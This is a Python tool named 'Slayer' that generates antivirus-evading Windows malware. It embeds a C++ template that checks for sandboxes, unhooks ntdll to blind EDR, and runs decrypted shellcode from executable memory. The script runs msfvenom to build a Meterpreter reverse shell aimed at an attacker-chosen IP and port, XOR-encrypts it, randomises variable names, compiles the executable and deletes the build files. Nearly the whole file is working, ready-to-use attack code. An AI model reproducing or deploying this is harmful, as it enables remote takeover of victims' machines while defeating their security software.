#!/usr/bin/env python3
import sys
import random
import string
import os
import time
import argparse


def get_random_string():
    length = random.randint(5, 35)
    result_str = ''.join(random.choice(string.ascii_letters) for i in range(length))
    return result_str


def xor(data, key):
    output_str = ""

    for i in range(len(data)):
        current = data[i]
        current_key = key[i % len(key)]
        o = lambda x: x if isinstance(x, int) else ord(x)
        output_str += chr(o(current) ^ ord(current_key))

    ciphertext = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in output_str) + ' };'
    return ciphertext


def create_template():
    template = open("template.cpp", "w+")
    template.write(
    r'''#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "user32.lib")
#define WIN32_LEAN_AND_MEAN
#include <iostream>
#include <tlhelp32.h>
#include <winternl.h>
#include <psapi.h>

#define UNICODE

		BOOL greenCardHuseyin() {
		  SYSTEM_INFO inf;
		  MEMORYSTATUSEX memStat;
		  DWORD proc;
		  DWORD belleq;
		  GetSystemInfo(&inf);
		  proc = inf.dwNumberOfProcessors;
		  if (proc < 2) return false;
		  memStat.dwLength = sizeof(memStat);
		  GlobalMemoryStatusEx(&memStat);
		  belleq = memStat.ullTotalPhys / 1024 / 1024 / 1024;
		  if (belleq < 2) return false;
		  return true;
		}
			
			

		BOOL AppisRunning(CHAR *app) {
		    BOOL bResult = FALSE;
		    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		    PROCESSENTRY32 pe32;
		    pe32.dwSize = sizeof(PROCESSENTRY32);

		    if(Process32First(hSnap, &pe32)) {
			do {
			    if(strcmp(pe32.szExeFile, app) == 0) {
				bResult = TRUE;
				break;
			    }
			} while(Process32Next(hSnap, &pe32));
		    }

		    CloseHandle(hSnap);

		    return bResult;
		}


int main(int argc, char** argv)
{

    if(!AppisRunning("RuntimeBroker.exe")) {

    } else {
    	
    if (greenCardHuseyin() == false) {
    return -2;
    }
    else{
    
        HANDLE process = GetCurrentProcess();
        MODULEINFO modi = {};
        HMODULE ntdll_handle = GetModuleHandleA("ntdll.dll");

        unsigned char buf[] = " ";
        char key[] = " ";
        char shellcode[sizeof buf];
        int j = 0;

        GetModuleInformation(process, ntdll_handle, &modi, sizeof(modi));
        LPVOID ntdllBase = (LPVOID)modi.lpBaseOfDll;
        HANDLE ntdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
        LPVOID ntdllMAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);

        PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
        PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

        for (int i = 0; i < sizeof buf; i++)
        {
            if (j == sizeof key - 1) j = 0;
            shellcode[i] = buf[i] ^ key[j];
            j++;
        }

        for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
            PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

            if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
                DWORD oldProtection = 0;
                bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
                memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
                isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
            }
        }

        void* noedrnocry = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(noedrnocry, shellcode, sizeof shellcode);
        ((void(*)())noedrnocry)();


        CloseHandle(process);
        CloseHandle(ntdllFile);
        CloseHandle(ntdllMapping);
        FreeLibrary(ntdll_handle);

        return 0;
    }
}
}

''')
    template.close()


def slayer(payload_type, ip, port, arch):
    xorkey = get_random_string()
    buf = get_random_string()
    shellcode = get_random_string()
    ntdllFile = get_random_string()
    ntdllMapping = get_random_string()
    ntdllMAddress = get_random_string()
    print("[*] Generating code...")
    create_template()
    time.sleep(1)
    venom = f"msfvenom -a {arch} --platform Windows -p windows/x64/meterpreter/reverse_{payload_type} LHOST={ip} LPORT={port} -f raw -o shellcode.raw"
    print(venom)
    os.system(venom)
    print("[*] Generating payload...")
    time.sleep(5)
    try:
        plaintext = open("shellcode.raw", "rb").read()
    except:
        print("[*] Failed to read shellcode.raw :(")
        print("[*] Missing shellcode.raw in pwd?")
        sys.exit(1)
    ciphertext = xor(plaintext, xorkey)
    template = open("template.cpp", "rt")
    data = template.read()
    time.sleep(1)
    data = data.replace('unsigned char buf[] = " ";', "unsigned char buf[] = " + ciphertext + " ")
    data = data.replace('char key[] = " "','char key[] = "' + xorkey + '"')
    data = data.replace("key", xorkey)
    data = data.replace("shellcode", shellcode)
    data = data.replace("ntdllFile", ntdllFile)
    data = data.replace("ntdllMapping", ntdllMapping)
    data = data.replace('ntdllMAddress', ntdllMAddress)
    template.close()
    template = open("slayer.cpp", "w+")
    template.write(data)
    time.sleep(1)

    template.close

banner ='''
											     uu$$$$$$$$$$$uu
											  uu$$$$$$$$$$$$$$$$$uu
											 u$$$$$$$$$$$$$$$$$$$$$u
											u$$$$$$$$$$$$$$$$$$$$$$$u
										       u$$$$$$$$$$$$$$$$$$$$$$$$$u
										       u$$$$$$$$$$$$$$$$$$$$$$$$$u
										       u$$$$$$"   "$$$"   "$$$$$$u
										       "$$$$"      u$u       $$$$"
											$$$u       u$u       u$$$
											$$$u      u$$$u      u$$$
											 "$$$$uu$$$   $$$uu$$$$"
											  "$$$$$$$"   "$$$$$$$"
											    u$$$$$$$u$$$$$$$u
											     u$"$"$"$"$"$"$u
										  uuu        $$u$ $ $ $ $u$$       uuu
										 u$$$$        $$$$$u$u$u$$$       u$$$$
										  $$$$$uu      "$$$$$$$$$"     uu$$$$$$
										u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
										$$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
										 """      ""$$$$$$$$$$$uu ""$"""
											   uuuu ""$$$$$$$$$$uuu
										  u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
										  $$$$$$$$$$""""           ""$$$$$$$$$$$"
										   "$$$$$"                      ""$$$$""
										     $$$"                         $$$$"
										      Mert Umut : @twitter.com/whoismept
									              Mert Daş  : @twitter.com/merterpreter
'''

def main():
    print(banner)
    print("Additional options:-t for payload, -a for architecture, -p for port number, -i for IP address\n")
    parser = argparse.ArgumentParser(description="Slayer: Undetected shellcode launcher generator, an AV Slayer..", 
    usage="slayer.py -t payload type -i IP address -p port number -a architecture \nExample: slayer.py -P windows/x64/meterpreter/reverse_tcp -i eth0 interface -p 4444 -a x64\n")
    parser.add_argument('-t', '--type', help="Define connection type eg. reverse_tcp, reverse_https, reverse_http", type=str, default="tcp")
    parser.add_argument('-i', '--ip', help="IP address for payload", type=str, default="eth0")
    parser.add_argument('-p', '--port', help="Port for payload", type=str, default=443)
    parser.add_argument('-a', '--arch', help="Architecture for payload", type=str, default="x64")
    args = parser.parse_args()
    try:
        slayer(args.type,args.ip, args.port, args.arch)
        print("[*] Initialising slayer()")
    except:
        print("[*] slayer() failed? :(")
        sys.exit(1)

    print("[+] Compiling...")
    application_name = get_random_string()
    os.system(f"x86_64-w64-mingw32-g++ -o {application_name}.exe slayer.cpp -static-libstdc++ -static-libgcc")
    time.sleep(1)
    os.system("rm -rf slayer.cpp template.cpp shellcode.raw")
    time.sleep(1)
    print("[*] Done :)")
    print(f"[*] {application_name}.exe generated")

if __name__ == "__main__":
    main()
